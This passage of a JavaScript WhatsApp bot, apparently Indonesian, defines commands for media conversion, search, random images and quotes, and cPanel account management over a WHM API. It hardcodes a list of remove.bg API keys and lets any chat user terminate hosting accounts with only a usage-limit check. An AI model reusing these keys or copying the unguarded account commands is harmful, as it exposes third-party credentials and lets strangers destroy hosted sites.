		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
	        let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
	        if (!/image/.test(mime)) throw respond
            if (!text) throw respond
	        m.reply(mess.wait)
            atas = text.split('|')[0] ? text.split('|')[0] : '-'
            bawah = text.split('|')[1] ? text.split('|')[1] : '-'
            let { TelegraPh } = require('./lib/uploader')
            let mee = await dica.downloadAndSaveMediaMessage(quoted)
            let mem = await TelegraPh(mee)
	        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
	        let awikwok = await dica.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.auhor })
	        await fs.unlinkSync(awikwok)
            }
	       break     
	        case 'simih': case 'simisimi': {
            if (!text) throw `Contoh : ${prefix + command} text`
            hm = await fetchJson(api('zenz', '/api/simisimi', { text : text }, 'f22b3c4c2c'))
            m.reply(hm.result.message)
            }
            break
            case 'toimage': case 'toimg': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
                let media = await dica.downloadAndSaveMediaMessage(quoted)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    dica.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
	        //━━━━━━━━━━━━━━━[ CONVERTER ]━━━━━━━━━━━━━━━━━//
case 'toimage': case 'toimg': {
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
m.reply(mess.wait)
let media = await dica.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
dica.sendMessage(m.chat, { image: buffer }, { quoted: m })
fs.unlinkSync(ran)
})
}
break
case 'tomp4': case 'tovideo': {
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
m.reply(mess.wait)
let { webp2mp4File } = require('./lib/uploader')
let media = await dica.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await dica.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
await fs.unlinkSync(media)
}
break
case 'toaud': case 'toaudio': {
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
m.reply(mess.wait)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
dica.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
break
case 'tomp3': {
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
if (/document/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
m.reply(mess.wait)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
dica.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${dica.user.name}.mp3`}, { quoted : m })
}
break
case 'tovn': case 'toptt': {
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
if (!quoted) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
m.reply(mess.wait)
let media = await quoted.download()
let { toPTT } = require('./lib/converter')
let audio = await toPTT(media, 'mp4')
dica.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
}
break
case 'togif': {
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
m.reply(mess.wait)
let { webp2mp4File } = require('./lib/uploader')
let media = await dica.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await dica.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
await fs.unlinkSync(media)
}
break
case 'tourl': {
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
m.reply(mess.wait)
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await dica.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
//━━━━━━━━━━━━━━━[ SEARCH ]━━━━━━━━━━━━━━━━━//
            case 'imagenobg': case 'removebg': case 'remove-bg': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
	    if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await dica.downloadAndSaveMediaMessage(quoted, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    m.reply(mess.wait)
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    dica.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
	    case 'yts': case 'ytsearch': {
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                if (!text) throw `Contoh : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
                }
                dica.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
        case 'google': {
        	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
if (!text) throw `Contoh : ${prefix + command} fatih arridho`
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `│➵  *Title* : ${g.title}\n`
teks += `│➵  *Description* : ${g.snippet}\n`
teks += `│➵  *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
m.reply(teks)
})
}
break
case 'yts': case 'ytsearch': {
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
if (!text) throw `Contoh : ${prefix + command} story wa anime`
let yts = require("yt-search")
let search = await yts(text)
let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks += `│➵  No : ${no++}\n│➵  Type : ${i.type}\n│➵  Video ID : ${i.videoId}\n│➵  Title : ${i.title}\n│➵  Views : ${i.views}\n│➵  Duration : ${i.timestamp}\n│➵  Upload At : ${i.ago}\n│➵  Author : ${i.author.name}\n│➵  Url : ${i.url}\n\n─────────────────\n\n`
}
dica.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
}
break
case 'google': {
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
if (!text) throw `Contoh : ${prefix + command} fatih arridho`
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `│➵  *Title* : ${g.title}\n`
teks += `│➵  *Description* : ${g.snippet}\n`
teks += `│➵  *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
m.reply(teks)
})
}
break
case 'play': case 'ytplay': {
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
if (!text) throw `Contoh : ${prefix + command} story wa anime`
let yts = require("yt-search")
let search = await yts(text)
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
let buttons = [
{buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: '♫ Audio'}, type: 1},
{buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: '► Video'}, type: 1}
]
let buttonMessage = {
image: { url: anu.thumbnail },
caption: `
│➵  Title : ${anu.title}
│➵  Ext : Search
│➵  Id : ${anu.videoId}
🪀 Duration : ${anu.timestamp}
│➵  Viewers : ${anu.views}
│➵  Upload At : ${anu.ago}
│➵  Author : ${anu.author.name}
│➵  Channel : ${anu.author.url}
│➵  Description : ${anu.description}
│➵  Url : ${anu.url}`,
footer: dica.user.name,
buttons: buttons,
headerType: 4
}
dica.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break
case 'ytmp3': case 'ytaudio': {
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let { yta } = require('./lib/y2mate')
if (!text) throw `Contoh : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
let quality = args[1] ? args[1] : '128kbps'
let media = await yta(text, quality)
if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
dica.sendImage(m.chat, media.thumb, `│➵  Title : ${media.title}\n│➵  File Size : ${media.filesizeF}\n│➵  Url : ${isUrl(text)}\n│➵  Ext : MP3\n│➵  Resolusi : ${args[1] || '128kbps'}`, m)
dica.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
}
break
case 'ytmp4': case 'ytvideo': {
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let { ytv } = require('./lib/y2mate')
if (!text) throw `Contoh : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
let quality = args[1] ? args[1] : '360p'
let media = await ytv(text, quality)
if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
dica.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `│➵  Title : ${media.title}\n│➵  File Size : ${media.filesizeF}\n│➵  Url : ${isUrl(text)}\n│➵  Ext : MP3\n│➵  Resolusi : ${args[1] || '360p'}` }, { quoted: m })
}
break
            case 'pinterest': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                m.reply(mess.wait)
		let { pinterest } = require('./lib/scraper')
                anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                dica.sendMessage(m.chat, { image: { url: result }, caption: '• Media Url : '+result }, { quoted: m })
            }
            break
//Hosting Menu
case 'createcp':
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let domain = q.split('|')[2]
let usern = q.split('|')[0]
let pekeg = q.split('|')[1]
if (args.length < 2) return m.reply(`Kirim perintah ${command} domain|package`)
m.reply("Creating please wait....")

axios.get(`https://${hostwhm}:2087/json-api/createacct?api.version=1&username=${usern}&contactemail=shymex404@gmail.com&pekeg=${pekeg}&domain=${domain}`, authWhm)
.then(response => {     
     let np = response.data
          if (np.metadata.result == 0) {
           m.reply(np.metadata.reason)
          } else {
           let dsta = np.metadata.output.raw;
            var substr = dsta.substring(
              dsta.toString().indexOf("+===================================+")
            ); //substr = 'word. Hello!'
            let nefft = substr.split("| Language: en")[0];
            m.reply(`${nefft}\n\nLogin : https://${hostwhm}:2087`)
  }});
break
case 'listcp':
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
m.reply('Wait Getting List Account info....')
axios.get(`https://${hostwhm}:2087/json-api/listaccts?api.version=1`, authWhm)
  .then((risol) => {
 let lisol = risol.data
 var ttdy = lisol.data.acct
let ogh = `*── 「 LIST CPANEL 」 ──*\nTotal Akun : ${ttdy.length}\n`
for (let i = 0; i < ttdy.length; i++) {
ogh += `
\n
─────[\`\`\` ${ttdy[i].user} \`\`\` ]────────
*▢ Maxsub* : ${ttdy[i].maxsub}
*▢ Maxsql* : ${ttdy[i].maxsql}
*▢ Startdate* : ${ttdy[i].startdate}
*▢ Disklimit* : ${ttdy[i].disklimit}
*▢ Maxlst* : ${ttdy[i].maxlst}
*▢ Plan* : ${ttdy[i].plan}
*▢ Owner*: ${ttdy[i].owner}
*▢ Ip* : ${ttdy[i].ip}
*▢ Domain* : ${ttdy[i].domain}
*▢ Diskused* : ${ttdy[i].diskused}
*▢ Maxaddons* : ${ttdy[i].maxaddons}
*▢ Suspendreason* : ${ttdy[i].suspendreason}
─────────────────\n\n`
}
m.reply(ogh)
})
				break
case 'terminate':
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
if (args.length < 2) return m.reply(`Kirim perintah ${command} username`)
m.reply('Wait Terminating Account....')
axios
    .get(
      `https://${hostwhm}:2087/json-api/removeacct?api.version=1&username=${args[1]}`, authWhm )
    .then((e) => {
      if ([1, "1"].includes(e.data?.metadata?.result))
      m.reply(`Done User ${args[1]} Telah di Terminate`);
      else {
        m.reply(e.metadata);
        console.log(e.data);
      }
    })
break
            case 'waifu': {
            	m.reply(mess.wait)
            if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                anu = await fetchJson(`https://waifu.pics/api/sfw/waifu`)
                buffer = await getBuffer(anu.url)
                let buttons = [{buttonId: `waifu`, buttonText: {displayText: 'Next Image'}, type: 1},{buttonId: `simplemenu`, buttonText: {displayText: '⬅️Back'}, type: 1}]
                let buttonMessage = {
                    image: buffer,
                    caption: `Random Waifu`,
                    footer: nyoutube,
                    buttons: buttons,
                    headerType: 4
                }
                dica.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	    case 'couple': {
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                m.reply(mess.wait)
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                dica.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
                dica.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break
            case 'coffe': case 'kopi': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
            let buttons = [
                    {buttonId: `coffe`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://coffee.alexflipnote.dev/random' },
                    caption: `☕ Random Coffe`,
                    footer: nyoutube,
                    buttons: buttons,
                    headerType: 4
                }
                dica.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'wallpaper': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                if (!text) throw 'Masukkan Query Title'
		let { wallpaper } = require('./lib/scraper')
                anu = await wallpaper(text)
                result = anu[Math.floor(Math.random() * anu.length)]
		let buttons = [
                    {buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image[0] },
                    caption: `• Title : ${result.title}\n• Category : ${result.type}\n• Detail : ${result.source}\n• Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
                    footer: nyoutube,
                    buttons: buttons,
                    headerType: 4
                }
                dica.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case 'brainly':
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
					if (args.length < 1) return m.reply('Pertanyaan apa')
		          	brien = args.join(' ')
					brainly(`${brien}`).then(res => {
					teks = '❉───────────────────────❉\n'
					for (let Y of res.data) {
					teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
					}
					dica.sendMessage(m.chat, teks, text,{quoted:m,detectLinks: false})                        
		            })              
					break
case 'tts': {
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
         	if (!text) throw `Contoh : ${prefix + command} text`
             let tts = await fetchJson(`https://api.akuari.my.id/texttovoice/texttosound_id?query=${text}`)
             dica.sendMessage(m.chat, { audio: { url: tts.result }, mimetype: 'audio/mpeg', fileName: `${text}.mp3` }, { quoted: m })
         	}
         break
            
            case 'wikimedia': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                if (!text) throw 'Masukkan Query Title'
		let { wikimedia } = require('./lib/scraper')
                anu = await wikimedia(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `wikimedia ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image },
                    caption: `• Title : ${result.title}\n• Source : ${result.source}\n• Media Url : ${result.image}`,
                    footer: nyoutube,
                    buttons: buttons,
                    headerType: 4
                }
                dica.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
//INI FITUR SHORT YA ADICK"//
            case 'tinyurl': {
            	
                if (!itsMeDica) throw mess.owner
            	if (!text) throw 'Masukkan Query Title'
                let anu = await fetchJson(`https://api.akuari.my.id/short/${command}?link=${text}`)
                dica.sendMessage(m.chat, { text: anu.hasil }, {quoted:m })
            }
            break
      
//INI FITUR SSWEB YA KONT//
//DIBAWAH FITUR STYLE TEXT YA. JING//
case 'styletext': {
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let { styletext } = require('./lib/scraper')
if (!text) throw 'Masukkan Query text!'
let anu = await styletext(text)
let teks = `Srtle Text From ${text}\n\n`
for (let i of anu) {
teks += `│➵  *${i.name}* : ${i.result}\n\n`
}
m.reply(teks)
}
break
//SELESAAAI//
            case 'quotesanime': case 'quoteanime': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
		let { quotesAnime } = require('./lib/scraper')
                let anu = await quotesAnime()
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `quotesanime`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: `~_${result.quotes}_\n\nBy '${result.karakter}' \n\nAnime : ${result.anime}\n\n- ${result.up_at}`,
                    footer: nyoutube,
                    buttons: buttons,
                    headerType: 2
                }
                dica.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	        case 'motivasi': {
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let anu = await fetchJson(`https://kocakz.herokuapp.com/api/random/text/quotes`)
                let buttons = [
                    {buttonId: `motivasi`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: anu.result.quote,
                    footer: nyoutube,
                    buttons: buttons,
                    headerType: 2
                }
                dica.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'quotes': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
    var Quotes = JSON.parse(fs.readFileSync('./storage/quotes/quotes.json'))
    var randomIndex = Math.floor(Math.random() * Quotes.length); //pilih index secara random
    var randomQuote = Quotes[randomIndex]; //ambil data pada index yang dipilih
    var author = randomQuote.author; //ambil author
    var quote = randomQuote.quotes; //ambil quotes
    let buttons = [
    {buttonId: `${command}`, buttonText: {displayText: '⬡ BACK'}, type: 1}
    ]
    let buttonMessage = {
    text: `${author} : ${quote}`,
    footer: mess.watermark,
    buttons: buttons,
    headerType: 2
    }
    dica.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break

case 'quotesjawa': {
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
var jawa = JSON.parse(fs.readFileSync('./storage/quotes/quotesjawa.json'))
var hasil = pickRandom(jawa)
let buttons = [
{buttonId: `${command}`, buttonText: {displayText: '⬡ BACK'}, type: 1}
]
let buttonMessage = {
text: `${hasil}`,
footer: mess.watermark,
buttons: buttons,
headerType: 2
}
dica.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break
case 'katagalau': {
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
var Quotes = JSON.parse(fs.readFileSync('./storage/quotes/katagalau.json'))
var hasil = pickRandom(Quotes)
let buttons = [
{buttonId: `${command}`, buttonText: {displayText: '⬡ BACK'}, type: 1}
]
let buttonMessage = {
text: `${hasil}`,
footer: mess.watermark,
buttons: buttons,
headerType: 2
}
dica.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break
case 'dilan': {
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
var Dilan = JSON.parse(fs.readFileSync('./storage/quotes/dilan.json'))
var hasil = pickRandom(Dilan)
let buttons = [
{buttonId: `${command}`, buttonText: {displayText: '⬡ BACK'}, type: 1}
]
let buttonMessage = {
text: `${hasil}`,
footer: mess.watermark,
buttons: buttons,
headerType: 2
}
dica.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break
case 'katabucin': {
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
var teks = JSON.parse(fs.readFileSync('./storage/quotes/katabucin.json'))
var hasil = pickRandom(teks)
let buttons = [
{buttonId: `${command}`, buttonText: {displayText: '⬡ BACK'}, type: 1}
]
let buttonMessage = {
text: `${hasil}`,
footer: mess.watermark,
buttons: buttons,
headerType: 2
}
dica.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break
case 'bucin': {
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
var bucin = JSON.parse(fs.readFileSync('./storage/quotes/bucin.json'))
var hasil = pickRandom(bucin)
let buttons = [
{buttonId: `${command}`, buttonText: {displayText: '⬡ BACK'}, type: 1}
]
let buttonMessage = {
text: `${hasil}`,
footer: mess.watermark,
buttons: buttons,
headerType: 2
}
dica.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break
case 'katailham': {
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
var ilham = JSON.parse(fs.readFileSync('./storage/quotes/katailham.json'))
var hasil = pickRandom(ilham)
let buttons = [
{buttonId: `${command}`, buttonText: {displayText: '⬡ BACK'}, type: 1}
]
let buttonMessage = {
text: `${hasil}`,
footer: mess.watermark,
buttons: buttons,
headerType: 2
}
dica.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break
case 'renungan': {
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
var renungan = JSON.parse(fs.readFileSync('./storage/quotes/renungan.json'))
var hasil = pickRandom(renungan)
let buttons = [
{buttonId: `${command}`, buttonText: {displayText: '⬡ BACK'}, type: 1}
]
let buttonMessage = {
text: `${hasil}`,
footer: mess.watermark,
buttons: buttons,
headerType: 2
}
dica.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break
case 'gombalan': {
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
var gombalan = JSON.parse(fs.readFileSync('./storage/quotes/gombalan.json'))
var hasil = pickRandom(gombalan)
let buttons = [
{buttonId: `${command}`, buttonText: {displayText: '⬡ BACK'}, type: 1}
]
let buttonMessage = {
text: `${hasil}`,
footer: mess.watermark,
buttons: buttons,
headerType: 2
}
dica.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break
//━━━━━━━━━━━━━━━[ TEXT PRO ]━━━━━━━━━━━━━━━━━//
            case 'berry': case 'glitch': case 'neon': case '3dboxtext': case 'pencil': case 'logobear': case '3dchristmas': case 'thunder': case 'magma': case 'strawberry': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                if (!text) throw 'No Query Text'
                m.reply(mess.wait)
                dica.sendMessage(m.chat, { image: { url: `https://api-Kilaaa.herokuapp.com/api/textpro/${command}?text=${text}` }, caption: `textpro ${command}` }, { quoted: m })
            }
            break
            case 'glitchtiktok': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                if (!text) throw 'No Query Text'
                m.reply(mess.wait)
                dica.sendMessage(m.chat, { image: { url: `https://Kilaaa-apiiiii.herokuapp.com/api/textpro/glitchtiktok?text=${text}&text2=${text}&apikey=dica` }, caption: `textpro ${command}` }, { quoted: m })
                }
                break
                        case 'candy': case 'christmas': case 'sparklechristmas': case 'holographic':
case 'deepsea': case 'blackpink': case 'scifi': case 'rainbow': case 'waterpipe': case 'spooky': case 'karbon': case 'colorneon': case 'circuit': case 'discovery': case 'metalic': case 'fiction': case 'demon': case '3dbox': 
case 'transformer': case '3dstone': case 'greenneon': 
case 'neonlight': case 'harrypotter': case 'brokenglass': case 'papercut': case 'lion2': 
case 'watercolor': case 'multicolor': case 'neondevil': case 'underwater': case 'graffitibike': case '3davengers': 
 case 'snow': case 'cloud': case 'honey': case 'ice': case 'fruitjuice': case 'biscuit': case 'wood': case 'whitebear': 
case 'chocolate': case 'matrix': case 'blood': case 'dropwater': case 'toxic': 
case 'lava': case 'rock': case 'bloodglas': case 'hallowen': case 'darkgold': case 'joker': case 'wicker':
 case 'firework': case 'skeleton': case 'sand': case 'glue': case '1917': case 'leaves': {
 	
             if (!q) return m.reply(`Contoh : ${prefix + command} dica`) 
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
             m.reply(mess.wait)
             let link
             if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
             if (/colorneon/.test(command)) link = 'https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html'
             if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
             if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
             if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
             if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
             if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
             if (/whitebear/.test(command)) link = 'https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html'
